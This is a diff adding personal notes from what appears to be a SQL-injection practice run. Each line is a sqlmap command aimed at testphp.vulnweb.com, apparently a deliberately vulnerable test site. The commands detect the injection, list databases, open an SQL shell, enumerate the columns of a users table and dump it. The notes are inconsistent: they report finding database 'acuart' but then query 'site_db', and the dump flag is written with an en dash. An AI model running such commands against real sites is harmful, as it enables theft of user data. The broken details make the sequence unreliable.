@@ -1,0 +1,21 @@
+//first command to check if site is vulnerable or not
+sqlmap -u "testphp.vulnweb.com/listproducts.php?cat=1" --crawl=2
+
+//checking db names
+sqlmap -u "testphp.vulnweb.com/listproducts.php?cat=1" --dbs 
+//got "acuart" and "information-schema"
+
+//checking vulnerability again on the specific db
+sqlmap -u "testphp.vulnweb.com/listproducts.php?cat=1" -D "acuart" 
+
+//opening SQL shell
+//dont know column names so checking them now
+sqlmap --dbms=mysql -u "testphp.vulnweb.com/listproducts.php?cat=1" --sql-shell
+//gotten column names so SQL shell can get specific queries
+
+//getting column names
+sqlmap -u "testphp.vulnweb.com/listproducts.php?cat=1" -D site_db -T users --columns
+
+//dumping data to excel file
+sqlmap -u "testphp.vulnweb.com/listproducts.php?cat=1" -D site_db -T users –dump
+taking a long time to dumb Data
